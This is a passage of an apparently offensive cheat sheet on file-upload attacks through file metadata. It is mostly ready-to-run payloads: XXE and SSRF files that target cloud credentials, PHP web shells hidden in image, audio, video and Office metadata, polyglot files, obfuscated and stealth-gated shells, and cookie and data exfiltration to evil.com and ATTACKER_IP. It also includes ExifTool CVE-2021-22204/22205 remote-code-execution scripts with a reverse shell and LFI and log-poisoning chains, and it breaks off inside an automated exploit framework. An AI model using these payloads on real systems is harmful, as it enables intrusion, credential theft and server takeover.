  # Generate SVG XXE payload
  cat > xxe.svg << 'SVGEOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <svg xmlns="http://www.w3.org/2000/svg"><text y="20">&xxe;</text></svg>
  SVGEOF

  # Generate SVG SSRF payload
  cat > ssrf.svg << 'SVGEOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
  <svg xmlns="http://www.w3.org/2000/svg"><text y="20">&ssrf;</text></svg>
  SVGEOF

  # Upload with various content types
  curl -F "file=@xss.svg;type=image/svg+xml" https://target.com/upload
  curl -F "file=@xss.svg;type=image/png" https://target.com/upload
  curl -F "file=@xss.svg;filename=avatar.svg" https://target.com/upload

  # Upload SVG disguised as other formats
  cp xss.svg xss.jpg
  cp xss.svg xss.png
  curl -F "file=@xss.jpg;type=image/jpeg" https://target.com/upload
  ```
  :::
::

---

## PDF Metadata Exploitation

::accordion
  :::accordion-item{icon="i-lucide-file-text" label="PDF Metadata Injection"}
  ```bash [Terminal]
  # Inject JavaScript into PDF metadata
  exiftool -Title='<script>alert(document.domain)</script>' evil.pdf
  exiftool -Author='<?php system($_GET["cmd"]); ?>' evil.pdf
  exiftool -Subject="' OR 1=1--" evil.pdf
  exiftool -Keywords='{{7*7}}' evil.pdf
  exiftool -Creator='<img src=x onerror=alert(1)>' evil.pdf

  # Create PDF with embedded JavaScript
  python3 << 'PYEOF'
  pdf = b"""%PDF-1.4
  1 0 obj
  << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
  endobj

  2 0 obj
  << /Type /Pages /Kids [3 0 R] /Count 1 >>
  endobj

  3 0 obj
  << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
  endobj

  4 0 obj
  << /Type /Action /S /JavaScript /JS (app.alert('XSS via PDF');) >>
  endobj

  xref
  0 5
  0000000000 65535 f 
  0000000009 00000 n 
  0000000074 00000 n 
  0000000126 00000 n 
  0000000205 00000 n 

  trailer
  << /Size 5 /Root 1 0 R >>
  startxref
  289
  %%EOF"""

  with open('js_evil.pdf', 'wb') as f:
      f.write(pdf)
  print("[+] PDF with JavaScript created")
  PYEOF

  # PDF with form action for SSRF
  python3 << 'PYEOF'
  pdf = b"""%PDF-1.4
  1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</S/URI/URI(http://169.254.169.254/latest/meta-data/)>>>>endobj
  2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
  3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
  xref
  0 4
  0000000000 65535 f 
  0000000009 00000 n 
  0000000128 00000 n 
  0000000177 00000 n 
  trailer<</Size 4/Root 1 0 R>>
  startxref
  244
  %%EOF"""
  with open('ssrf.pdf', 'wb') as f:
      f.write(pdf)
  PYEOF

  # Upload PDF payloads
  curl -F "file=@js_evil.pdf;type=application/pdf" https://target.com/upload
  curl -F "file=@ssrf.pdf;type=application/pdf" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-link" label="PDF SSRF & Data Exfiltration"}
  ```bash [Terminal]
  # Generate PDF with external form submission
  cat > ssrf_form.pdf << 'EOF'
  %PDF-1.4
  1 0 obj
  <</Type /Catalog /Pages 2 0 R /AcroForm << /Fields [4 0 R] /XFA 5 0 R >> >>
  endobj
  2 0 obj
  <</Type /Pages /Kids [3 0 R] /Count 1>>
  endobj
  3 0 obj
  <</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>
  endobj
  4 0 obj
  <</Type /Annot /Subtype /Widget /FT /Tx /T (data) /V (exfiltrated_data) /Rect [0 0 0 0] /AA << /F << /S /SubmitForm /F (http://ATTACKER_IP:8080/collect) /Flags 4 >> >> >>
  endobj

  xref
  0 5
  0000000000 65535 f 
  0000000009 00000 n 
  0000000096 00000 n 
  0000000148 00000 n 
  0000000226 00000 n 

  trailer
  <</Size 5 /Root 1 0 R>>
  startxref
  450
  %%EOF
  EOF

  # Using wkhtmltopdf SSRF (if server converts HTML to PDF)
  cat > ssrf.html << 'EOF'
  <iframe src="http://169.254.169.254/latest/meta-data/" width="100%" height="100%">
  </iframe>
  <img src="http://internal-server:8080/admin/config">
  <link rel="stylesheet" href="http://169.254.169.254/latest/user-data">
  <script>
    new Image().src = "http://ATTACKER_IP:8080/?data=" + document.documentElement.innerHTML;
  </script>
  EOF

  curl -F "file=@ssrf.html;type=text/html" https://target.com/html-to-pdf
  ```
  :::
::

---

## Office Document Metadata Exploitation

::tabs
  :::tabs-item{icon="i-lucide-file-spreadsheet" label="OOXML Metadata Injection"}
  ```bash [Terminal]
  # DOCX/XLSX/PPTX are ZIP archives with XML metadata

  # Extract and modify core.xml
  mkdir docx_extracted
  unzip document.docx -d docx_extracted/
  
  # Inject XSS into document properties
  cat > docx_extracted/docProps/core.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</dc:title>
    <dc:creator><![CDATA[<?php system($_GET["cmd"]); ?>]]></dc:creator>
    <dc:description>' OR 1=1--</dc:description>
    <cp:keywords>{{7*7}}</cp:keywords>
    <cp:lastModifiedBy><img src=x onerror=alert(1)></cp:lastModifiedBy>
  </cp:coreProperties>
  EOF

  # Repack the DOCX
  cd docx_extracted && zip -r ../evil.docx . && cd ..

  # Inject XXE into DOCX
  cat > docx_extracted/docProps/core.xml << 'EOF'
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>&xxe;</dc:title>
  </cp:coreProperties>
  EOF

  cd docx_extracted && zip -r ../xxe.docx . && cd ..

  # Upload
  curl -F "file=@evil.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" https://target.com/upload
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ExifTool on Office Files"}
  ```bash [Terminal]
  # Direct metadata injection using ExifTool
  exiftool -Title='<?php system($_GET["cmd"]); ?>' document.docx
  exiftool -Author='<script>alert(1)</script>' document.xlsx
  exiftool -Subject="' UNION SELECT password FROM users--" document.pptx
  exiftool -Keywords='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}' document.docx
  exiftool -Description='${jndi:ldap://ATTACKER_IP:1389/exploit}' document.docx

  # Verify
  exiftool -a document.docx

  # OLE metadata for legacy .doc/.xls/.ppt
  exiftool -Title='<?php system($_GET["cmd"]); ?>' legacy.doc
  exiftool -Author='<script>alert(1)</script>' legacy.xls
  ```
  :::
::

---

## Audio & Video Metadata Exploitation

::collapsible

::tabs
  :::tabs-item{icon="i-lucide-music" label="Audio Metadata"}
  ```bash [Terminal]
  # MP3 ID3 tag injection
  exiftool -Artist='<?php system($_GET["cmd"]); ?>' evil.mp3
  exiftool -Comment='<script>alert(document.cookie)</script>' evil.mp3
  exiftool -Title="' OR 1=1--" evil.mp3
  exiftool -Album='{{7*7}}' evil.mp3
  exiftool -Genre='<?php eval(base64_decode($_POST["p"])); ?>' evil.mp3

  # Using id3v2 tool
  id3v2 -c '<?php system($_GET["cmd"]); ?>' evil.mp3
  id3v2 -a '<script>alert(1)</script>' evil.mp3
  id3v2 -t "' UNION SELECT 1,2,3--" evil.mp3

  # FLAC metadata
  metaflac --set-tag="ARTIST=<?php system(\$_GET['cmd']); ?>" evil.flac
  metaflac --set-tag="COMMENT=<script>alert(1)</script>" evil.flac

  # WAV metadata
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.wav
  exiftool -Artist='<script>alert(document.domain)</script>' evil.wav

  # OGG metadata
  vorbiscomment -w evil.ogg << 'EOF'
  ARTIST=<?php system($_GET["cmd"]); ?>
  COMMENT=<script>alert(1)</script>
  TITLE=' OR 1=1--
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-video" label="Video Metadata"}
  ```bash [Terminal]
  # MP4/MOV metadata injection
  exiftool -Title='<?php system($_GET["cmd"]); ?>' evil.mp4
  exiftool -Artist='<script>alert(document.cookie)</script>' evil.mp4
  exiftool -Comment="' OR 1=1--" evil.mp4
  exiftool -Description='{{7*7}}' evil.mp4

  # Using ffmpeg to add metadata
  ffmpeg -i clean.mp4 -metadata title='<?php system($_GET["cmd"]); ?>' \
         -metadata artist='<script>alert(1)</script>' \
         -metadata comment="' UNION SELECT password FROM users--" \
         -c copy evil.mp4

  # AVI metadata
  exiftool -Comment='<?php passthru($_GET["cmd"]); ?>' evil.avi
  
  # MKV metadata
  mkvpropedit evil.mkv --set title='<?php system($_GET["cmd"]); ?>'

  # WebM metadata
  ffmpeg -i clean.webm -metadata title='<script>alert(1)</script>' -c copy evil.webm

  # Verify
  ffprobe -show_format evil.mp4 2>/dev/null | grep -i "tag"
  exiftool -a evil.mp4 | grep -iE "title|artist|comment"
  ```
  :::
::

::

---

## Polyglot File Construction

::caution
Polyglot files are simultaneously valid as multiple file types. They bypass content-type checks, extension filters, and magic byte validation while carrying executable payloads in metadata regions.
::

::code-group
```bash [JPEG-PHP Polyglot]
# Method 1: GIF89a header + PHP
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.gif.php
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.php.gif

# Method 2: Valid JPEG with PHP in Comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' clean.jpg
cp clean.jpg polyglot.jpg.php

# Method 3: JPEG with PHP shell after EOI marker
cp clean.jpg polyglot.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php.jpg

# Method 4: Construct from scratch
python3 << 'PYEOF'
payload = b'<?php system($_GET["cmd"]); ?>'

# Valid JPEG header + PHP in EXIF Comment + minimal image data
jpeg = bytearray([
    0xFF, 0xD8,                          # SOI
    0xFF, 0xE0, 0x00, 0x10,             # APP0 JFIF
    0x4A, 0x46, 0x49, 0x46, 0x00,       # JFIF\0
    0x01, 0x01, 0x00, 0x00, 0x01,
    0x00, 0x01, 0x00, 0x00,
])

# COM marker with PHP payload
import struct
jpeg.extend([0xFF, 0xFE])
jpeg.extend(struct.pack('>H', len(payload) + 2))
jpeg.extend(payload)

# Minimal valid image body
jpeg.extend([
    0xFF, 0xC0, 0x00, 0x0B, 0x08,
    0x00, 0x01, 0x00, 0x01, 0x01,
    0x01, 0x11, 0x00,
    0xFF, 0xC4, 0x00, 0x1F, 0x00,
    0x00, 0x01, 0x05, 0x01, 0x01,
    0x01, 0x01, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x02, 0x03,
    0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B,
    0xFF, 0xDA, 0x00, 0x08, 0x01,
    0x01, 0x00, 0x00, 0x3F, 0x00,
    0x7B, 0x40,
    0xFF, 0xD9                          # EOI
])

with open('polyglot_full.php.jpg', 'wb') as f:
    f.write(jpeg)
print("[+] JPEG-PHP polyglot created")
PYEOF

# Verify it's both valid JPEG and contains PHP
file polyglot_full.php.jpg
identify polyglot_full.php.jpg
strings polyglot_full.php.jpg | grep "php"
```

```bash [PNG-PHP Polyglot]
# PNG with PHP in tEXt chunk
python3 << 'PYEOF'
import struct, zlib

def chunk(ctype, data):
    c = ctype + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

payload = b'<?php system($_GET["cmd"]); ?>'

sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
text = chunk(b'tEXt', b'Comment\x00' + payload)
idat = chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00'))
iend = chunk(b'IEND', b'')

png = sig + ihdr + text + idat + iend

with open('polyglot.php.png', 'wb') as f:
    f.write(png)

# Also create version with payload in IDAT (survives reprocessing)
# Encode PHP in DEFLATE stream that's also valid PHP
payload_idat = zlib.compress(b'\x00' + payload + b'\x00' * (3 - len(payload) % 3 if len(payload) % 3 else 0))
idat2 = chunk(b'IDAT', payload_idat)
png2 = sig + ihdr + text + idat2 + iend

with open('polyglot_idat.php.png', 'wb') as f:
    f.write(png2)

print("[+] PNG-PHP polyglots created")
PYEOF
```

```bash [SVG-HTML Polyglot]
# SVG that's also valid HTML with JavaScript
cat > polyglot.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text y="20">&xxe;</text>
  <script type="text/javascript">
    fetch('https://evil.com/steal?cookie=' + document.cookie);
  </script>
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.domain)</script>
    </body>
  </foreignObject>
</svg>
EOF

cp polyglot.svg polyglot.html
cp polyglot.svg polyglot.xhtml
```

```bash [GIFAR (GIF+JAR/ZIP)]
# GIF that's also a valid ZIP/JAR archive
# Useful when the server serves uploaded files and Java applets are processed

# Create a simple Java class
cat > Evil.java << 'EOF'
import java.io.*;
public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("curl http://ATTACKER_IP:8080/pwned");
        } catch (Exception e) {}
    }
}
EOF
javac Evil.java 2>/dev/null
jar cf evil.jar Evil.class

# Prepend GIF header
printf 'GIF89a' | cat - evil.jar > gifar.gif

# Verify
file gifar.gif
unzip -l gifar.gif
```
::

---

## ExifTool CVE Exploitation

::warning
ExifTool itself has critical vulnerabilities. CVE-2021-22204 allows arbitrary code execution when ExifTool processes a crafted image. If the target server uses ExifTool to strip or read metadata, uploading a malicious file achieves RCE.
::

::tabs
  :::tabs-item{icon="i-lucide-bug" label="CVE-2021-22204 (ExifTool RCE)"}
  ```bash [Terminal]
  # CVE-2021-22204: Improper neutralization of user data in DjVu file format
  # Affects ExifTool versions 7.44 to 12.23

  # Method 1: Using djvumake
  # Install djvulibre
  apt install djvulibre-bin

  # Create malicious DjVu annotation
  python3 -c "
  import base64
  cmd = 'id > /tmp/pwned'
  payload = '(metadata (Copyright \"\\\\" . qx{' + cmd + '} . \\\\" b \"))'
  print(payload)
  " > payload.txt

  # Create annotation chunk
  bzz < payload.txt payload.bzz

  # Create minimal DjVu file
  djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

  # Rename to image extension
  cp exploit.djvu exploit.jpg

  # Upload
  curl -F "file=@exploit.jpg" https://target.com/upload

  # Method 2: Using pre-built exploit
  # https://github.com/convisolabs/CVE-2021-22204-exiftool
  git clone https://github.com/convisolabs/CVE-2021-22204-exiftool
  cd CVE-2021-22204-exiftool

  # Generate reverse shell payload
  python3 exploit.py -s ATTACKER_IP -p 4444

  # Method 3: Manual construction with configfile trick
  cat > eval.config << 'EOF'
  %Image::ExifTool::UserDefined = (
      'Image::ExifTool::Exif::Main' => {
          0xd000 => {
              Name => 'EvilTag',
              Writable => 'string',
              WriteGroup => 'IFD0',
          },
      },
  );
  1;
  __END__
  system("id > /tmp/pwned");
  EOF

  exiftool -config eval.config -EvilTag="test" image.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="CVE-2021-22205 (GitLab ExifTool RCE)"}
  ```bash [Terminal]
  # GitLab used ExifTool to strip metadata from uploaded images
  # CVE-2021-22205 chains with CVE-2021-22204 for unauthenticated RCE

  # Method 1: Direct exploitation
  python3 << 'PYEOF'
  import requests
  import struct
  import subprocess
  import sys

  target = sys.argv[1] if len(sys.argv) > 1 else "https://target-gitlab.com"

  # Create DjVu exploit payload
  cmd = 'curl http://ATTACKER_IP:8080/$(whoami)'
  annotation = f'(metadata (Copyright "\\\\" . qx{{{cmd}}} . \\\\" b "))'

  # Write annotation
  with open('/tmp/payload.txt', 'w') as f:
      f.write(annotation)

  # Create bzz compressed annotation
  subprocess.run(['bzz', '/tmp/payload.txt', '/tmp/payload.bzz'])

  # Create DjVu
  subprocess.run(['djvumake', '/tmp/exploit.djvu', 'INFO=1,1', 'BGjp=/dev/null', 'ANTz=/tmp/payload.bzz'])

  # Upload to GitLab (unauthenticated endpoint)
  with open('/tmp/exploit.djvu', 'rb') as f:
      djvu_data = f.read()

  # GitLab processes images on various endpoints
  endpoints = [
      '/uploads/user',
      '/api/v4/projects',
      '/-/profile/avatar',
  ]

  for endpoint in endpoints:
      try:
          r = requests.post(
              f"{target}{endpoint}",
              files={'file': ('exploit.jpg', djvu_data, 'image/jpeg')},
              verify=False,
              timeout=10
          )
          print(f"[*] {endpoint}: {r.status_code}")
      except Exception as e:
          print(f"[-] {endpoint}: {e}")
  PYEOF

  # Method 2: Using existing tools
  # https://github.com/mr-r3bot/Gitlab-CVE-2021-22205
  python3 exploit.py -t https://target-gitlab.com -c "id"
  ```
  :::
::

---

## Metadata Persistence & Processing Bypass

::steps{level="4"}

#### Identify Server-Side Image Processing

```bash [Terminal]
# Upload image with markers in every metadata field
exiftool \
  -Comment='MARKER_COMMENT' \
  -Artist='MARKER_ARTIST' \
  -Copyright='MARKER_COPYRIGHT' \
  -ImageDescription='MARKER_DESCRIPTION' \
  -UserComment='MARKER_USERCOMMENT' \
  -XPComment='MARKER_XPCOMMENT' \
  -XMP-dc:Description='MARKER_XMPDESC' \
  -ICC_Profile<=test.icc \
  -Software='MARKER_SOFTWARE' \
  -Make='MARKER_MAKE' \
  -Model='MARKER_MODEL' \
  probe.jpg

# Upload and re-download
curl -F "file=@probe.jpg" https://target.com/upload
curl -o downloaded.jpg https://target.com/uploads/probe.jpg

# Check which markers survived
echo "=== Metadata Survival Analysis ==="
for marker in COMMENT ARTIST COPYRIGHT DESCRIPTION USERCOMMENT XPCOMMENT XMPDESC SOFTWARE MAKE MODEL; do
  count=$(strings downloaded.jpg | grep -c "MARKER_${marker}")
  echo "MARKER_${marker}: ${count} occurrences"
done

# Full comparison
exiftool -a -u probe.jpg > before.txt
exiftool -a -u downloaded.jpg > after.txt
diff before.txt after.txt
```

#### Identify Processing Library

```bash [Terminal]
# Check Software tag in processed image
exiftool -Software downloaded.jpg

# Common signatures:
# "Adobe Photoshop" - Photoshop
# "GraphicsMagick" - GM
# "ImageMagick" - IM
# "PIL" / "Pillow" - Python Pillow
# "Sharp" - Node.js Sharp
# "GD" - PHP GD Library
# "libvips" - VIPS library

# Check for library-specific artifacts
identify -verbose downloaded.jpg 2>&1 | head -5
exiftool -a -G1 downloaded.jpg | grep -i "software\|creator\|producer"

# Fingerprint via error responses
# Upload intentionally corrupt image and analyze error
printf '\xFF\xD8\xFF\xE0CORRUPT' > corrupt.jpg
curl -v -F "file=@corrupt.jpg" https://target.com/upload 2>&1 | grep -i "error\|exception\|magick\|gd\|pillow\|sharp"
```

#### Target Surviving Metadata Fields

```bash [Terminal]
# Based on survival analysis, inject payloads into surviving fields

# If EXIF Comment survives:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' attack.jpg

# If ICC Profile survives (common with ImageMagick):
exiftool -ICC_Profile<=malicious.icc attack.jpg

# If XMP survives:
exiftool -XMP-dc:Description='<?php system($_GET["cmd"]); ?>' attack.jpg

# If IPTC survives:
exiftool -IPTC:Caption-Abstract='<?php system($_GET["cmd"]); ?>' attack.jpg

# If JFIF Comment survives:
python3 -c "
import struct
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
with open('clean.jpg', 'rb') as f: data = f.read()
# Insert COM marker after SOI
com = b'\xFF\xFE' + struct.pack('>H', len(payload)+2) + payload
modified = data[:2] + com + data[2:]
with open('attack_com.jpg', 'wb') as f: f.write(modified)
"

# Double-encode payload for servers that decode metadata
exiftool -Comment='%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E' attack.jpg
```

#### Validate Execution

```bash [Terminal]
# Test inclusion/execution
# Direct access
curl -v "https://target.com/uploads/attack.jpg"
curl "https://target.com/uploads/attack.jpg?cmd=id"

# If server renders metadata in pages
curl -s "https://target.com/gallery" | grep -i "system\|php\|script"
curl -s "https://target.com/image/attack.jpg/info" | grep -i "system\|php"

# If local file inclusion exists
curl "https://target.com/page?file=../uploads/attack.jpg&cmd=id"
curl "https://target.com/index.php?page=uploads/attack.jpg&cmd=id"

# Check if .htaccess allows PHP execution in uploads
curl "https://target.com/uploads/.htaccess"

# Try accessing with PHP extension via path traversal
curl "https://target.com/uploads/attack.jpg/.php?cmd=id"
curl "https://target.com/uploads/attack.jpg%00.php?cmd=id"
curl "https://target.com/uploads/attack.php.jpg?cmd=id"
```

::

---

## Encoding & Obfuscation Techniques

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Base64 Encoded Payloads"}
  ```bash [Terminal]
  # Base64 encoded PHP shell in metadata
  PAYLOAD=$(echo -n '<?php system($_GET["cmd"]); ?>' | base64)
  exiftool -Comment="<?php eval(base64_decode('${PAYLOAD}')); ?>" encoded.jpg

  # Double base64
  INNER=$(echo -n 'system($_GET["cmd"]);' | base64)
  exiftool -Comment="<?php eval(base64_decode('$(echo -n "eval(base64_decode('${INNER}'));" | base64)')); ?>" double_encoded.jpg

  # ROT13 encoded
  exiftool -Comment='<?php eval(str_rot13("flfgrz(\$_TRG[\"pzq\"]);")); ?>' rot13.jpg

  # Hex encoded
  exiftool -Comment='<?php eval(hex2bin("73797374656d28245f4745545b22636d64225d293b")); ?>' hex.jpg

  # Chr() obfuscation
  exiftool -Comment='<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a($_GET["cmd"]); ?>' chr.jpg

  # Variable function call
  exiftool -Comment='<?php $f="sys"."tem";$f($_GET["cmd"]); ?>' varfunc.jpg

  # Backtick execution
  exiftool -Comment='<?php echo `{$_GET["cmd"]}`; ?>' backtick.jpg

  # Short tags (if enabled)
  exiftool -Comment='<?=`$_GET[cmd]`?>' shorttag.jpg
  exiftool -Comment='<?=system($_GET[cmd])?>' shorttag2.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="WAF Bypass Payloads"}
  ```bash [Terminal]
  # Case variation
  exiftool -Comment='<?PHP System($_GET["cmd"]); ?>' case.jpg
  exiftool -Comment='<?pHp SyStEm($_GET["cmd"]); ?>' case2.jpg

  # Whitespace obfuscation
  exiftool -Comment='<?php	system	(	$_GET	[	"cmd"	]	)	;	?>' whitespace.jpg

  # Newline injection
  exiftool -Comment=$'<?php\nsystem\n(\n$_GET\n[\n"cmd"\n]\n)\n;\n?>' newline.jpg

  # Comment obfuscation
  exiftool -Comment='<?php /*bypass*/system/*bypass*/($_GET/*bypass*/["cmd"])/*bypass*/; ?>' comment_bypass.jpg

  # String concatenation
  exiftool -Comment='<?php $a="sy"."st"."em";$a($_GET["cmd"]); ?>' concat.jpg

  # Variable variables
  exiftool -Comment='<?php $a="system";$$a=$a;$$a($_GET["cmd"]); ?>' varvar.jpg

  # Null byte injection (older PHP)
  exiftool -Comment=$'<?php system($_GET["cmd"]); ?>\x00' nullbyte.jpg

  # Unicode/UTF-8 tricks
  exiftool -Comment='<?php ﻿system($_GET["cmd"]); ?>' bom.jpg

  # Alternative PHP tags
  exiftool -Comment='<script language="php">system($_GET["cmd"]);</script>' scripttag.jpg

  # Using assert (PHP < 7.2)
  exiftool -Comment='<?php @assert($_GET["cmd"]); ?>' assert.jpg

  # Using create_function
  exiftool -Comment='<?php $f=create_function("","system(\$_GET[cmd]);");$f(); ?>' createfunc.jpg

  # Using array_map
  exiftool -Comment='<?php array_map("system",array($_GET["cmd"])); ?>' arraymap.jpg

  # Using call_user_func
  exiftool -Comment='<?php call_user_func("system",$_GET["cmd"]); ?>' calluserfunc.jpg

  # Using usort (PHP < 7)
  exiftool -Comment='<?php usort($_GET,"sy"."stem"); ?>' usort.jpg

  # Double-dollar variable
  exiftool -Comment='<?php $_="system";$_($_GET["cmd"]); ?>' dollar.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Anti-Detection Payloads"}
  ```bash [Terminal]
  # Payload that only executes with specific parameter
  exiftool -Comment='<?php if(md5($_GET["key"])==="098f6bcd4621d373cade4e832627b4f6"){system($_GET["cmd"]);}?>' auth.jpg
  # Trigger: ?key=test&cmd=id

  # Time-delayed execution
  exiftool -Comment='<?php if(date("H")=="03"){system($_GET["cmd"]);}?>' timed.jpg

  # IP-restricted execution
  exiftool -Comment='<?php if($_SERVER["REMOTE_ADDR"]=="ATTACKER_IP"){system($_GET["cmd"]);}?>' iplock.jpg

  # User-Agent gated
  exiftool -Comment='<?php if(strpos($_SERVER["HTTP_USER_AGENT"],"SecurityBot")!==false){system($_GET["cmd"]);}?>' uagate.jpg

  # Cookie-based trigger
  exiftool -Comment='<?php if($_COOKIE["auth"]==="s3cr3t"){system($_GET["cmd"]);}?>' cookie.jpg

  # Header-based trigger
  exiftool -Comment='<?php if(isset($_SERVER["HTTP_X_CUSTOM"])){system($_SERVER["HTTP_X_CUSTOM"]);}?>' header.jpg
  # Trigger: curl -H "X-Custom: id" https://target.com/uploads/header.jpg

  # Self-deleting payload
  exiftool -Comment='<?php system($_GET["cmd"]);unlink(__FILE__);?>' selfdelete.jpg

  # Log-free payload (suppress errors)
  exiftool -Comment='<?php @error_reporting(0);@ini_set("display_errors",0);@system($_GET["cmd"]);?>' stealth.jpg
  ```
  :::
::

---

## Chaining Metadata Attacks with LFI/RFI

::note
Metadata-based code execution often requires chaining with Local File Inclusion (LFI) or server misconfigurations to trigger payload execution. The uploaded image contains the payload; LFI includes it as PHP code.
::

::code-group
```bash [LFI + Metadata Shell]
# Step 1: Create image with PHP payload in metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg

# Step 2: Upload to target
curl -F "file=@shell.jpg" https://target.com/upload
# Note the upload path: /uploads/shell.jpg

# Step 3: Chain with LFI
# Direct inclusion
curl "https://target.com/index.php?page=../uploads/shell.jpg&cmd=id"
curl "https://target.com/index.php?file=uploads/shell.jpg&cmd=whoami"
curl "https://target.com/view.php?template=../../../var/www/uploads/shell.jpg&cmd=id"

# PHP wrapper chains
curl "https://target.com/index.php?page=php://filter/resource=../uploads/shell.jpg&cmd=id"

# Null byte (PHP < 5.3.4)
curl "https://target.com/index.php?page=../uploads/shell.jpg%00&cmd=id"

# Double encoding
curl "https://target.com/index.php?page=..%252fuploads%252fshell.jpg&cmd=id"

# Path truncation (PHP < 5.3)
curl "https://target.com/index.php?page=../uploads/shell.jpg$(python3 -c 'print("/"*4096)')&cmd=id"
```

```bash [Log Poisoning + Metadata Chain]
# If direct LFI isn't available but log files are accessible

# Step 1: Inject PHP via User-Agent into access log
curl -A '<?php system($_GET["cmd"]); ?>' https://target.com/

# Step 2: Include the log file
curl "https://target.com/index.php?page=/var/log/apache2/access.log&cmd=id"
curl "https://target.com/index.php?page=/var/log/nginx/access.log&cmd=id"

# Step 3: Alternative - inject via uploaded image metadata + access the metadata endpoint
# Some applications have endpoints that display image metadata
curl "https://target.com/api/image/metadata?file=../uploads/shell.jpg"
curl "https://target.com/exif?image=uploads/shell.jpg"
```

```bash [PHP Session + Metadata Chain]
# Inject PHP payload into session file via metadata
# If the application stores metadata in sessions

# Step 1: Upload image with payload
exiftool -Comment='<?php system($_GET["cmd"]); ?>' session_shell.jpg
curl -F "file=@session_shell.jpg" -c cookies.txt https://target.com/upload

# Step 2: Get session ID
SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')

# Step 3: Include session file via LFI
curl "https://target.com/index.php?page=/tmp/sess_${SESSID}&cmd=id"
curl "https://target.com/index.php?page=/var/lib/php/sessions/sess_${SESSID}&cmd=id"
```
::

---

## Automated Exploitation Tools

::tabs
  :::tabs-item{icon="i-lucide-wrench" label="Custom Automation Script"}
  ```python [meta_exploit.py]
  #!/usr/bin/env python3
  """
  Metadata-Based File Upload Exploit Framework
  Generates payloads, uploads, and validates execution
  """
  import argparse
  import requests
  import subprocess
  import tempfile
  import os
  import sys

  class MetadataExploiter:
      PAYLOADS = {
          'php_system': '<?php system($_GET["cmd"]); ?>',
          'php_passthru': '<?php passthru($_GET["cmd"]); ?>',
          'php_shell_exec': '<?php echo shell_exec($_GET["cmd"]); ?>',
          'php_eval_b64': '<?php eval(base64_decode($_POST["p"])); ?>',
          'php_backtick': '<?php echo `{$_GET["cmd"]}`; ?>',
          'php_short': '<?=`$_GET[cmd]`?>',
          'xss_basic': '<script>alert(document.domain)</script>',
          'xss_img': '<img src=x onerror=alert(document.cookie)>',
          'xss_svg': '<svg/onload=alert(1)>',
          'sqli_union': "' UNION SELECT username,password FROM users--",
          'sqli_error': "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
          'sqli_time': "' AND SLEEP(5)--",
          'ssti_jinja': '{{config.items()}}',
          'ssti_twig': '{{_self.env.getFilter("id")}}',
          'xxe_file': '<!ENTITY xxe SYSTEM "file:///etc/passwd">&xxe;',
          'cmdi_basic': '$(id)',
          'cmdi_backtick': '`id`',
          'cmdi_pipe': '|id',
      }

      FIELDS = [
          'Comment', 'Artist', 'Copyright', 'ImageDescription',
          'UserComment', 'XPComment', 'XPAuthor', 'Software',
          'Make', 'Model', 'OwnerName', 'HostComputer',
          'XMP-dc:Description', 'XMP-dc:Creator', 'XMP-dc:Rights',
